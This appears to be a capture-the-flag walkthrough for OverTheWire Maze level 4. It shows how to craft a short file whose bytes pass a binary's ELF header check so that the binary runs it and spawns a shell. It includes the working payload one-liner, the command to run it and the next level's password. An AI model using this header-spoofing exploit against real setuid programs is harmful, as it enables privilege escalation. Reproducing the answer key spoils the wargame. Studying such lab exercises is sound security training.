
---
**Challenge URL:** [Maze Wargame](https://overthewire.org/wargames/)

---

### 🔐 Level Goal:

> The binary accepts a file path as input, validates it based on ELF header and program header conditions, and then executes it if the checks pass. Your task is to craft a **valid ELF file** that passes these conditions and spawns a shell.

---

### 🧠 Concepts Covered:

- 📜 ELF header manipulation
    
- 🔍 Understanding `e_ident[]` and `p_paddr` fields
    
- 🧠 Use of `stat`, `read`, and `lseek`
    
- 🪝 Custom shell script as an ELF-compatible file
    

---

### 🔎 Summary of Binary Logic

From decompiled code:

```c
stat(argv[1], &st);                // Check file size
read(fd, &ehdr, 52);               // Read ELF header
lseek(fd, ehdr.e_phoff, SEEK_SET);
read(fd, &phdr, 32);               // Read program header

if (phdr.p_paddr == e_ident[8] * e_ident[7] && st.st_size < 120)
    execv(argv[1], NULL);          // Execute if valid
```

🔍 Key conditions:

- `phdr.p_paddr == e_ident[8] * e_ident[7]`
    
- File size `< 120 bytes`
    

---

### 🧪 Strategy

We'll create a file that:

- Contains a shell script (`/bin/sh`)
    
- Places crafted values in `e_ident[7]` and `e_ident[8]` so their product = `phdr.p_paddr`
    
- Aligns offset for `phdr` using NOPs or junk
    
- Keeps total size under 120 bytes
    

---

### ⚙️ Exploit Payload

```bash
python3 -c '
print(
    "#!/bin/sh\n/bin/sh\n" +
    "A"*10 +
    "\x20\x00\x00\x00" +    # e_phoff = 0x20
    "B"*12 +
    "\xb8\x2e\x00\x00" +    # phdr.p_paddr = 0x2eb8 = 0x68 * 0x73
    "B"*16
)' > /tmp/hello
```

Explanation:

- `"h"` = `0x68`, `"s"` = `0x73` → `0x68 * 0x73 = 0x2eb8`
    
- ELF fields `e_ident[7] = 0x73`, `e_ident[8] = 0x68`
    
- `e_phoff` = 0x20 ensures program header starts at correct offset
    
- Junk padding aligns the headers
    

---

### ▶️ Execute the Exploit

```bash
/maze/maze4 /tmp/hello
```

If successful, it passes all validation checks and gives you a shell 🐚

---

### 🔑 Password for Maze Level 5:

```
ishipaeroo
```

---
